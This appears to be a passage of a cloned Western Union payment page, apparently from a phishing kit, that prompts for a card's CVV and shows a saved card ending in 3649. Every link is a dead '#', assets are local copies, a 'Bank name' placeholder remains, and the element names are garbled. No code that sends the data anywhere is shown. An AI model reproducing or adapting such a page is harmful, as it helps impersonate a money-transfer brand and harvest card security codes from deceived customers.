                                <div class="details xsmall-font history-details-element outer-pay-box margin-top-2 ng-scope tile-expanded" id="cvvdetailsContainer1" style="">
                <div id="ccvdylna" class="space-btwn padding-15 payment-container font14 padding-bottom-0">

                                    

                <div class="row mr-pay-margin">
                    <div class="">
                        <div class="dddd col-xs-12 col-sm-12 cvv-section padding-bottom-5 ng-scope col-md-5 col-lg-5">
                            <span class="wu-field wu-float-label input-border">
                            
                                <div class="ng-scope">										
                                    <input type="tel" amplitude-id="textbox-saved-security-code" minlength="3" name="txtSecurityCode" id="txtSecurityCode" aria-label="txtSecurityCode" maxlength="3" class="form-control error-behavior wu-custom-no-padding ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength empty ng-valid-validity ng-touched" required="required" style="" required="required" style="" aria-describedby="txtSecurityCodeinputError" aria-invalid="false"  >



<div class="floating-label">CVV</div>




                                </div>





                                
                                <span id="txtSecurityCodeSuccess" class="sr-only">(<translate class="ng-scope">CVV</translate>)</span>


   


                                <div class="wu-custom-cvv-inline-block">
<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>
                                  </div>
                            </span>
                            
                         

                            <span class="block-message font14 ng-scope" style=""><translate class="ng-scope"><span id="txtSecurityCodeinputError" class="empty error" style="display: none;"></span></translate></span>

                            
                            <div class="wu-custom-clear"></div>
                        </div>
                        
                         
                        

                        
                        <div class="hidden-md hidden-lg ng-scope">
                                <div class="btn-payment-hint-container margin-top-10">
                                    <button type="submit" class="btn btn-primary btn-block no-margin"><translate class="ng-scope">Continue</translate></button>



                                    <div class="margin-top-10 text-center ng-scope"></div>



                                    
                                </div>
                            </div>
                
                 
                 
                
                        <div class="wu-custom-clear"></div>
                        <div class="hidden-sm hidden-xs padding-left-15 padding-right-15 margin-top-20 margin-bottom-20 ng-scope">
                            <div class="ng-scope">
                                <button type="submit" amplitude-id="button-continue-to-review" class="btn btn-primary btn-block no-margin">Continue</button>
                                

              
                            </div>

                        </div>


<div class="row text-center font18 padding-bottom-20">

<a id="sadccv"  ><translate class="ng-scope">Cancel</translate></a>

</div> 


         <script>
$(document).ready(function(){
  $("#dircardccv").click(function(){

    $("#addNefwCarddIdconess").attr("style","transform: rotate(90deg); transition: all 0.25s ease 0.25s;");


    $("#ccvdylna").show(500);
  });
  $("#sadccv").click(function(){
    $("#ccvdylna").hide(500);


    $("#addNefwCarddIdconess").attr("style","transform: rotate(0deg); transition: all 0.1s ease 0.1s;");

  });
});
</script>
           </div>

                    
                    
                    
                    

                </div>  

                

                                    
                
                  
                  
                      
               <div class="wu-custom-clear"></div>
            </div>
            
                	
            </div>
            
            
            
            

            </div>   
        </div>
    </div>
</div>





    </div>
    </div>
    </div>
</div>
</div></form>

<div class="modal popup-modal fade" id="areyousure-modal" role="dialog">
    <div class="popup-overlay-vertical-center">
        <div class="modal-dialog popup-overlay-body">
            <div class="modal-content areyousure-content">
                <div class="modal-body popup-modal-body">
                    <img class="areyousureimagestyle" src="./style/css/Alert-icon.svg" alt="Alert-icon">
                    <p class="areyousuretext"><translate class="ng-scope">Are you sure you want to remove this card ?</translate></p>
                </div>
                <div class="modal-footer areyousure-modal-footer">
                    <a href="#" class="areyousureNo" data-dismiss="modal" aria-label="modal" amplitude-id="button-no-delete-card">
                        <translate class="ng-scope">No</translate>
                    </a>
                    <a ng-click="paymentInfoVm.deleteCards();" id="areyousureYes" data-dismiss="modal" href="javascript:void(0);" aria-label="Cancel Transaction" data-linkname="delete-card-confirm" amplitude-id="button-yes-delete-card">
                        <translate class="ng-scope">Yes</translate>
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="showccv-modal" class="modal popup-modal fade" role="dialog">
    <div class="cross-mark-cvv pull-right" data-dismiss="modal">
        <a href="#" class="areyouOk" data-dismiss="modal">
            <img class="cross-icon" src="./style/css/icon-close-blue.svg" alt="icon-close">
        </a>
    </div>
    <div class="popup-overlay-vertical-center" data-dismiss="modal">
        <div class="modal-dialog popup-overlay-body" style="vertical-align:middle">
            <div class="modal-content areyousure-content" style="background-color:transparent;text-align:center">
                <div class="card-code">
                    <h1><translate class="ng-scope">Bank name</translate></h1>
                    <p><translate class="ng-scope">These are the last 3 digits on the back of your card</translate></p>
                </div>
                <div class="ok-button-block">
                    <button class="ok-btn" data-dismiss="modal" amplitude-id="button-ok-close-cvv-modal">
                        <translate class="ng-scope">OK</translate>
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="modal popup-modal fade" id="showC1253-modal" role="dialog">
<div class="popup-overlay-vertical-center">
    <div class="modal-dialog popup-overlay-body center-vertical">
        <div class="max-card-error-container">

            <div style="text-align-last: end; padding: 3%">
                <a href="#" class="areyouOk" data-dismiss="modal">
                    <img class="cross-icon" src="./style/css/icon-close-blue.svg" alt="icon-close" style="margin-top: 5px; margin-right: 5px;">
                </a>
            </div>

            <!--Error Handling Start-->
            <div ng-show="paymentInfoVm.maxCardError" class="ng-hide">
                <div class="col-sm-12 upperPadding" style="background-color: #d73747; color: #fae8ea;">
                    <div>
                        <div class="headerInMobileWhite">
                            <p class="sizeIn ng-binding"><img class="iconManage" src="./style/css/icon-failure-red-48.svg" alt="icon-close-gray">
                                </p>
                        </div>
                    </div>

                </div>
            </div>

            <div style=" padding: 0 5% 5% 5%;">
                <img class="decline-alert-icon" style="display: block; margin: 0 auto;" src="./style/css/icon-alert-orange48.svg" alt="Alert-icon">
                <div style="text-align: center; padding: 5% 0;">
                    <p>
                        <translate class="ng-scope">You can store up to 5 cards for payments.To add a new one, please delete a card from your list.</translate>
                    </p>
                </div>


<div ng-repeat="items in paymentInfoVm.deleteCardList" class="margin-top-10 paymentinfo-tile sum-wid-ff ng-scope" style="">
                    <div class="delete-card-info" id="1">
                        <span   class="col-xs-3 col-lg-2 col-md-2 col-sm-2 padding-right-0 card-image-savelist"></span>
                        <div class="col-xs-5 col-lg-5 col-md-5 col-sm-5">
                            <div class="padding-left-0 card-list-align wu-custom-padding-bottom" ng-switch="items.cardType">
                                                               

                            </div>
                            <div class="">
                                <div class="card-info-text ending-in"><translate class="ng-scope">Ending in:</translate></div>
                                <div class="card-info-text ng-binding">3649</div>
                            </div>
                        </div>
                        <div class="col-xs-2 col-lg-2 col-md-2 col-sm-2 cardexpiry-adjust card-list-align">
                            <div class="wu-custom-date"><translate class="ng-scope">MM/YYYY</translate></div>
                            <div class="wu-custom-exp-date ng-binding">MM/YYYY</div>
                        </div>


                    </div>
                </div>

                <div class="modal-content areyousure-content" style="background-color:transparent;text-align:center">
                    <button type="button" class="btn btn-primary btn-block" >
                        <translate class="ng-scope">Delete a card</translate>
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>
</div>


</div>
</div>       
        
        

                </div><div style="clear:both"></div>

            
<div class="container-fluid ng-scope" ng-if="!paymentInfoVm.cvvHide">
    <div class="flex-row col-lg-12" >

        <div class="wu-responsive-columns col-lg-8 col-md-8 col-sm-12 col-xs-11  colctrl">
                <div class="globaldisclaimerwidgetreferer page section">


    <br>
    <div class="ng-scope">
        <div class="row">


             <div class="col-sm-12 margin-10">
                
                    
                    

                </div>
            </div>
    </div>
    
</div>
</ng-include>
</div>
</div>       
        
        

                <div class="wu-responsive-columns col-lg-4 col-md-4  hidden-sm  hidden-xs  colctrl ng-scope">
                    </div></div><div style="clear:both"></div>
</div>

</div></div></section>

</div>
                </div>
            </div>
        </section>
         
        
        
            <footer data-wurpfooter="">
                 <div class="footer parsys"><div class="footer section">






    






<footer>
  


			

<div class="copyrightlinks-menu-container ng-scope">
    <div class="container copyrightlinks-container">
        <div class="col-sm-12 col-xs-12 quicklinks" hidelinks=""><ul>
<li><a href="#">Home</a></li>
<li><a href="#">About us</a></li>
<li><a href="#">Contact us</a></li>
<li><a href="#">Blog</a></li>
<li><a href="#">Help</a></li>
<li><a href="#">Fraud awareness</a></li>
<li><a href="#">Investor relations</a></li>
<li><a href="#">Careers</a></li>
<li><a href="#" target="_blank">Western Union Foundation</a></li>
<li><a href="#">News</a></li>
<li><a href="#">Become an agent</a></li>
<li><a href="#">Payment solutions</a></li>
<li><a href="#" target="_blank">State licensing</a></li>
<li><a href="#">Law enforcement subpoena information</a></li>
<li><a href="#">Terms and Conditions</a></li>
<li><a href="#">Online Privacy Statement</a></li>
<li><a href="#">Sitemap</a></li>
</ul>
</div>
		<div id="ga_dis" class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text"><p>Western Union Financial Services, Inc., is LICENSED BY THE GEORGIA DEPARTMENT OF BANKING AND FINANCE and Licensed as Money Transmitter by the New York State Department of Financial Services.</p>
</div>
		<div class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text"><p>  2020 Western Union Holdings, Inc. All Rights Reserved</p>
</div>
        <div class="col-sm-4 col-md-3 col-xs-12 social-icons-container">
        	<div class="social-media-text"><p><b>Follow us</b>&nbsp;on</p>
</div>
            <div class="social-icons">
            	<a href="#" target="_blank"><img src="./style/css/icon-sm-facebook.png" alt="facebook"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-youtube.png" alt="youtube"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-instagram.png" alt="instagram"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-twitter.png" alt="twitter"></a>
            </div>
        </div>

        
    </div>
</div>

</footer>






</div>

</div>

            </footer>
        
    </div>
    
    
    
    




    

    



        


</body></html>
